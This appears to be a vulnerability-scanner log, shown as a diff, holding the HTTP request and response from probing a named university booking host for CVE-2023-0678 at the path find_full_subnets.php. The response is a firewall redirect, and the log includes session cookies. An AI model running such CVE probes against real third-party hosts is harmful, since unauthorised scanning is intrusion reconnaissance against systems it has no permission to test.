@@ -1,0 +1,28 @@
+[CVE-2023-0678] Dumped HTTP request for https://bookings.mdhs.unimelb.edu.au/functions/scripts/find_full_subnets.php
+
+
+GET /functions/scripts/find_full_subnets.php HTTP/1.1
+Host: bookings.mdhs.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2023-0678] Dumped HTTP response https://bookings.mdhs.unimelb.edu.au/functions/scripts/find_full_subnets.php
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://bookings.mdhs.unimelb.edu.au/functions/scripts/find_full_subnets.php
+Set-Cookie: visid_incap_3209806=Dy/xEh7fS9uSA5c4VN+hMvtxk2gAAAAAQUIPAAAAAAC5oOg22cFr4Mci8QLaqLeS; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3209806=eSGzK+hl3Rdc1Larov5JA/txk2gAAAAA04oajuO5zdbQ+TUCByk9OA==; path=/; Domain=.mdhs.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 14-12101771-0 0NNN RT(1754493436250 27) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
